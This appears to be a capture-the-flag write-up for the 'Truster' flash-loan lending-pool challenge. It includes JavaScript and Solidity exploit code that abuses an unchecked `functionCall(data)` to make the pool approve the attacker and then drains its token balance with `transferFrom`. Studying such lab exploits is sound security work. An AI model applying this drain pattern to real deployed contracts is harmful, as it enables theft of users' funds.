# Level 3 : Truster

This challenge reminded me one of Ethernaut challenges. It took advantages of ERC20 tokens bad implemented.

To guide you , here are the functions publicly available when implementing an ERC20 token : 

- ***totalSupply()***
- ***balanceOf(address _owner)***
- ***transfer(address _to, uint256 _value)***
- ***transferFrom(address _from, address _to, uint256 _value)***
- ***approve(address _spender, uint256 _value)***
- ***allowance(address _owner, address _spender)***

Have an idea now ? the vulnerable code is here : `target.functionCall(data);`

*Note: **calldata** is usually used to encode functions for talking directly to the EVM. Which is this case is an indication that we should be sending an encoded function definition for the `target` to satisfy*

It’s a kind of Re-Entrancy we will use here. When we use `flashLoan()` function from the contract we can execute or call a function we want using the functionCall(data), and that’s the idea.

The main point is to find another way to transfer tokens but a way in 2 steps would be perfect because there is a check whether funds have been paid back or no here : `require(balanceAfter >= balanceBefore);`

Hopefully there is a well known way to do this in 2 steps in an ERC20 implementation : 

1. Step 1 : Approve transfer allowance using `approve(address _spender, uint256 _value)` 
2. Step 2 : Transfer funds using `transferFrom(address _from, address _to, uint256 _value)`

As `approve()` and `transferFrom()` are not implemented in TrusterLenderPool we have all the rights to do it.

**Conclusion :** what we can do here is instead of trying to steal the tokens, we can `approve()` our address for the total balance of the DVT contract and circle back after our approval is successfully made and `transfer`all of the DVT tokens to myself.

### Using only Javascript :

```jsx
const ABI = [
          "function approve(address spender,uint256 amount)"
        ]
const interface = new ethers.utils.Interface(ABI);
const data = interface.encodeFunctionData("approve",[attacker.address,TOKENS_IN_POOL.toString()]);
await this.pool.flashLoan(0,attacker.address,this.token.address,data);
await this.token.connect(attacker).transferFrom(this.pool.address,attacker.address,TOKENS_IN_POOL)
```

### Using a contract :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./TrusterLenderPool.sol";

contract AttackerTruster{
  function attackTruster(IERC20 token, TrusterLenderPool pool, address attacker_) public {
    uint256 poolBalance = token.balanceOf(address(pool));
    // IERC20::approve(address spender, uint256 amount)
    bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
    pool.flashLoan(0, attacker_, address(token), payload);
    // Then Transfer Tokens to us
    token.transferFrom(address(pool), attacker_, poolBalance);
  }
}
```

and 

```jsx
const Attacker = await ethers.getContractFactory('AttackerTruster', attacker)
this.attackerContract = await Attacker.deploy();
// Attack
await this.attackerContract.connect(attacker).attackTruster(this.token.address,this.pool.address,attacker.address);
```

### Key Security Takeaways

- When interfacing with contracts or implementing an ERC interface, implement all available functions.
- As always never trust any outside user, specially when allowing them to call a function with an argument that can be crafted